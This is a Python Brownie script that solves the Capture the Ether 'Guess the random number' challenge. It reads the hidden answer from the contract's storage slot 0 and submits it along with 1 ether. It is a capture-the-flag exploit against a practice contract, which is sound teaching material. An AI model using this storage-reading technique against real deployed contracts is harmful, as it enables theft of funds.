from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import GuessTheRandomNumberChallenge

##########################################
# This time the number is generated based on a couple fairly random sources.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        guess_the_random_number = load_challenge(ContractObject=GuessTheRandomNumberChallenge, instance_key='guess_the_random_number')
    else:
        guess_the_random_number = deploy_locally(ContractObject=GuessTheRandomNumberChallenge, from_account=_from | {'value':1e18})
    
    # get the secret number from contract storage
    answer = int(web3.eth.get_storage_at(guess_the_random_number.address, '0x').hex(), 16)

    # call guess()
    guess_the_random_number.guess(answer, _from | {'value':1e18})

    # check the result
    result = guess_the_random_number.isComplete()
    print(result)

    # return the result
    return result

def main():
    solve_challenge()
